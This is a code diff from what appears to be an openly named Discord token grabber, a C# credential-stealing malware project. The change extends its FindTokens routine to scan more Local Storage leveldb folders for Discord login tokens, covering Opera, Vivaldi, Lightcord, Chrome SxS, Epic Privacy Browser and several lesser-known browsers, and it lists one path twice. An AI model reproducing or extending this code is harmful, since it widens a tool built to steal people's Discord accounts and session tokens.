@@ -1,4 +1,4 @@
-﻿using Qvoid_Token_Grabber.Misc;
+using Qvoid_Token_Grabber.Misc;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -460,12 +460,26 @@ namespace Qvoid_Token_Grabber.Discord
         static private List<string> FindTokens(List<string> TokensLocation)
         {
             string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
             //Adding known tokens paths.
-            TokensLocation.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
             TokensLocation.Add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
             TokensLocation.Add(localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
             TokensLocation.Add(localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
+            TokensLocation.Add(localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Lightcord\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Amigo\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Torch\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Kometa\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Orbitum\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\CentBrowser\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
+            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
+
 
             List<string> tokens = new List<string>();
 
